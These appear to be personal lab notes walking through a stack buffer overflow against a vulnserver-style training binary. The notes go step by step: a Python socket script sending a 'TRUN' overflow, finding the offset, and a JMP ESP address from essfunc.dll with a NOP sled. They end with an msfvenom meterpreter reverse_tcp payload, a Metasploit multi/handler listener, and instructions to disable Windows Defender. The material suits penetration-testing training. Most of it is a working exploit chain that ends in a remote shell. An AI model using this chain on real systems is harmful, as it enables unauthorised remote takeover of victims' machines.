    https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
_________________________________________________________________________________________________________________
### Static Analysis
#### Performing basic analysis
    strings secureserverind.exe | more
    file secureserverind.exe
_________________________________________________________________________________________________________________
### Running the program
#### Checking the ports to see if the port we identified is listening
    netstat -anto
_________________________________________________________________________________________________________________
### Using linux to make script
#### Script is to create socket to connect to the program we identified
    vim winbuff.py
```
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 5000

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating Socket, IPv4 TCP
s.connect(("192.168.65.10",9999)) ## Define host and port
print s.recv(1024) ## Print to screen the response
s.send(buf) ## Send variable buf
print s.recv(1024) ## Print to screen the response
s.close() ## Close the socket
```
_________________________________________________________________________________________________________________
### Run immunitydebugger as admin
#### File > attach > select instance > attach > click run/red arrow
_________________________________________________________________________________________________________________
### Use the site to generate 5000 characters
    https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
#### Copy and paste in the script replacing the "A" and dropping the * 5000
_________________________________________________________________________________________________________________
### Rewind the immunitydebugger and hit run again
#### Then rerun the script
_________________________________________________________________________________________________________________
### Next copy the EIP and paste into the register value
    https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
#### To find the offset 2003
_________________________________________________________________________________________________________________
### Next update the script by deleting the 5000 generated characters and adding the two lines below
#### buf += "A" * 2003
#### buf += "BBBB"
_________________________________________________________________________________________________________________
### Rewind the immunitydebugger and run again
#### Make sure the script it saved and run it again, should get back 42424242 in the EIP field
_________________________________________________________________________________________________________________
### Can delete the "BBBB" line, just to ensure it ran properly
#### Back on the immunitydebugger run the command below in the bottom bar
    !mona modules                            ## To see the fields are vulnerable for the dll
    !mona jmp -r esp -m "essfunc.dll"        ## To locate the space in memory the dll is at
_________________________________________________________________________________________________________________
### Back on immunitydebugger after you run the second command
#### click on Window in the top and select 2  Log Data
#### Find the Results select and copy the first line (address) 625012A0
_________________________________________________________________________________________________________________
### Back on the script add the address into the script and add the nop sled
    buf += "\xa0\x12\x50\x62"
    buf += "\x90" * 15
_________________________________________________________________________________________________________________
### Now to create a shellcode for the script
#### Use your linux IP in the lhost
    msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.21.223 lport=4444 -b "\x00" -f python
_________________________________________________________________________________________________________________
### Copy everything after the first buf += b""
#### and paste below the nop sled line
_________________________________________________________________________________________________________________
### Next run msfconsole
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost 0.0.0.0
    set lport 4444
    exploit
_________________________________________________________________________________________________________________
### Go back to the windows opstation
#### Rewind immunitydebugger and run again
#### Ensure windows defend is turned off
#### Ensure everything in virus & threat protection settings are off as well
_________________________________________________________________________________________________________________
### Make sure you rewind immunitydebugger and run 
#### Make sure you write to the script then run the script
_________________________________________________________________________________________________________________
### Multihandler should start sending stage
#### If not go back and rewind and run immunitydebugger, ensure script is correct and run again.
_________________________________________________________________________________________________________________
